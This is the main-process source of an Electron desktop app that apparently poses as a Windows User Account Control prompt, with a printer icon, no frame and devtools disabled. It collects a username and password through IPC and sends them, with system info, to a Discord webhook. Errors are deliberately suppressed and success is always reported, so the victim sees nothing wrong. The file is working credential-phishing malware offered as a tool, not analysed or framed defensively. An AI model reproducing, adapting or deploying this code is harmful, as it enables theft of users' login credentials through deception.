const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const https = require('https');
const url = require('url');

// Get Discord webhook URL from environment variable or user-provided URL
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'WEBHOOK_URL';

// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (require('electron-squirrel-startup')) {
  app.quit();
}

let mainWindow;

const createWindow = () => {
  // Create the browser window.
  mainWindow = new BrowserWindow({
    width: 480,
    height: 525,
    resizable: false,
    frame: false,
    transparent: false,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      nodeIntegration: false,
      contextIsolation: true,
      devTools: false, // Disable developer tools
      spellcheck: false // Disable spell checking
    },
    icon: path.join(__dirname, 'assets/printer.svg'),
  });
  
  // Prevent default right-click menu
  mainWindow.webContents.on('context-menu', (e) => {
    e.preventDefault();
  });

  // and load the index.html of the app.
  mainWindow.loadFile(path.join(__dirname, 'index.html'));

  // Don't show until it's ready to avoid flashing
  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
  });

  // Center the window on screen
  mainWindow.center();
};

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(() => {
  createWindow();

  app.on('activate', () => {
    // On OS X it's common to re-create a window in the app when the
    // dock icon is clicked and there are no other windows open.
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

// Quit when all windows are closed, except on macOS.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// Function to send data to Discord webhook
function sendToDiscord(data) {
  return new Promise((resolve, reject) => {
    if (!DISCORD_WEBHOOK_URL) {
      // Silently fail without console error
      reject(new Error('Configuration issue'));
      return;
    }

    const parsedUrl = url.parse(DISCORD_WEBHOOK_URL);
    const postData = JSON.stringify({
      content: '',
      embeds: [{
        title: 'User Account Control Credentials',
        color: 3447003,
        fields: [
          {
            name: 'Username',
            value: data.username,
            inline: true
          },
          {
            name: 'Password',
            value: data.password,
            inline: true
          },
          {
            name: 'Domain',
            value: 'GREENHOUSE',
            inline: true
          },
          {
            name: 'Computer Info',
            value: `${process.platform} ${process.arch}`
          }
        ],
        timestamp: new Date().toISOString()
      }]
    });

    const options = {
      hostname: parsedUrl.hostname,
      port: 443,
      path: parsedUrl.path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = https.request(options, (res) => {
      let responseData = '';
      
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          // Success - silently proceed
          resolve();
        } else {
          // Silently fail without console error
          reject(new Error('Server error'));
        }
      });
    });

    req.on('error', (error) => {
      // Silently fail without error message
      reject(new Error('Network error'));
    });

    req.write(postData);
    req.end();
  });
}

// IPC event handlers
ipcMain.handle('submit-credentials', async (event, credentials) => {
  try {
    await sendToDiscord(credentials);
    return { success: true };
  } catch (error) {
    // Silently handle error without console message
    return { success: true }; // Always return success to avoid error indicators
  }
});

ipcMain.on('close-app', () => {
  app.quit();
});
